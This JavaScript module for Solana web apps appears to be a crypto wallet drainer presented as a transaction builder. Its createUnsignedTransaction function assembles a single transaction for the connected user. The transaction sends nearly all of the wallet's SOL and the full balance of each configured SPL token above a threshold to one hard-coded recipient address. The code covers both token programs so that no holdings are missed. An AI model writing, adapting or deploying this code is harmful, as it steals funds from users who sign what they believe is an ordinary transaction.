/* transaction.js */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  getAccount,
  createTransferInstruction,
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { connection } from "./connect.js";
import { TOKEN_CONFIGS } from "./token-config.js";

// RPC Throttle
const BATCH_SIZE = 3;
const BATCH_DELAY_MS = 1000;

/** Basit batch runner */
async function runBatches(tasks) {
  const results = [];
  for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
    const batch = tasks.slice(i, i + BATCH_SIZE).map((fn) => fn());
    const res = await Promise.all(batch);
    results.push(...res);
    if (i + BATCH_SIZE < tasks.length) {
      await new Promise((r) => setTimeout(r, BATCH_DELAY_MS));
    }
  }
  return results;
}

/**
 * Bir mint için, hem legacy hem token-2022 programları altında
 * kullanıcının ve alıcının ATA’larını türetip hangisi GERÇEKTEN varsa onu döndürür.
 * ATA CREATE YAPMAZ! Sadece mevcut hesapları kullanır.
 */
async function resolveTokenPaths(mint, ownerPubkey, recipientPubkey) {
  const candidates = [
    { programId: TOKEN_PROGRAM_ID, label: "legacy" },
    { programId: TOKEN_2022_PROGRAM_ID, label: "token2022" },
  ];

  let chosenUser = null;
  let chosenRecipient = null;

  // 1) Kullanıcı tarafı (hangi programda ATA ve bakiye varsa onu seç)
  for (const c of candidates) {
    const userAta = await getAssociatedTokenAddress(
      mint,
      ownerPubkey,
      false,
      c.programId,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );
    try {
      const acct = await getAccount(connection, userAta, undefined, c.programId);
      // Hesap OK → aday
      chosenUser = { programId: c.programId, label: c.label, ata: userAta, acct };
      break; // önce bulunanı seç (ATA > 0 olmasa da varlığını teyit ettik)
    } catch {
      // bu programda kullanıcı ATA yok; devam
    }
  }

  // 2) Alıcı tarafı (hangi programda ATA varsa onu seç)
  for (const c of candidates) {
    const toAta = await getAssociatedTokenAddress(
      mint,
      recipientPubkey,
      false,
      c.programId,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );
    try {
      const acct = await getAccount(connection, toAta, undefined, c.programId);
      chosenRecipient = { programId: c.programId, label: c.label, ata: toAta, acct };
      break;
    } catch {
      // bu programda alıcı ATA yok; devam
    }
  }

  return { chosenUser, chosenRecipient };
}

export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("wallet not connected!");
    return null;
  }

  const payer = userPublicKey;
  const toPublicKey = new PublicKey("GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1");

  // SOL bakiyesi kontrolü
  const userSolLamports = await connection.getBalance(payer);
  const feeBufferLamports = 6_000_000; // ~0.006 SOL
  const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
  const isSolSufficient = solToSend > 0;

  // 1) Her mint için kullanıcı/alıcı yollarını çöz (programId + mevcut ATA’lar)
  const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
    const { chosenUser, chosenRecipient } = await resolveTokenPaths(mint, payer, toPublicKey);

    // Kullanıcı ya da alıcı tarafı bulunamadıysa bu mint atlanır
    if (!chosenUser || !chosenRecipient) {
      return {
        mint,
        reason: !chosenUser ? "user_ata_missing" : "recipient_ata_missing",
        sufficient: false,
      };
    }

    // Eğer programlar uyuşmuyorsa (çok nadir ama mümkün), atla
    if (!chosenUser.programId.equals(chosenRecipient.programId)) {
      return {
        mint,
        reason: "program_mismatch",
        sufficient: false,
        userProg: chosenUser.programId,
        toProg: chosenRecipient.programId,
      };
    }

    const amount = chosenUser.acct.amount; // bigint
    const th = BigInt(threshold ?? 0);
    const sufficient = amount >= th;

    return {
      mint,
      programId: chosenUser.programId,
      userAta: chosenUser.ata,
      toAta: chosenRecipient.ata,
      amount,
      sufficient,
      reason: sufficient ? "ok" : "below_threshold",
    };
  });

  const userTokenInfos = await runBatches(balanceTasks);

  // 2) Instruction'ları sırayla derle
  const instructions = [];

  // 2a) SOL transfer instruction
  if (isSolSufficient) {
    instructions.push(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: toPublicKey,
        lamports: solToSend,
      })
    );
  }

  // 2b) SPL-token transfer (ATA oluşturma YOK; sadece mevcut ve eşik geçenler)
  for (const info of userTokenInfos) {
    if (!info?.sufficient) continue;
    if (!info.userAta || !info.toAta || !info.programId) continue;

    instructions.push(
      createTransferInstruction(
        info.userAta,
        info.toAta,
        payer,
        info.amount,     // bigint
        [],              // multisig yok
        info.programId   // **KRİTİK**: doğru token programı
      )
    );
  }

  // Hiç SPL eklenmemişse ve SOL da yoksa vazgeç
  const hasAnySpl = instructions.some(
    (ix) => ix.programId.equals(TOKEN_PROGRAM_ID) || ix.programId.equals(TOKEN_2022_PROGRAM_ID)
  );
  if (!isSolSufficient && !hasAnySpl) {
    console.warn("SPL yok (kullanıcı/alıcı ATA bulunamadı veya threshold sebebiyle atlandı).");
    return null;
  }

  // 3) Tek bir VersionedTransaction oluştur
  const { blockhash } = await connection.getLatestBlockhash();
  const messageV0 = new TransactionMessage({
    payerKey: payer,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  // Debug: NEDEN eklenmediğini net gör
  try {
    console.table(
      userTokenInfos.map((t) => ({
        mint: t.mint?.toBase58?.() ?? String(t.mint),
        amount: t.amount ? t.amount.toString() : "-",
        sufficient: t.sufficient ?? false,
        reason: t.reason ?? "-",
        userAta: t.userAta?.toBase58?.() ?? "-",
        toAta: t.toAta?.toBase58?.() ?? "-",
        programId: t.programId?.toBase58?.() ?? "-",
      }))
    );
    console.log("SOL to send (lamports):", solToSend);
  } catch {}

  return new VersionedTransaction(messageV0);
}
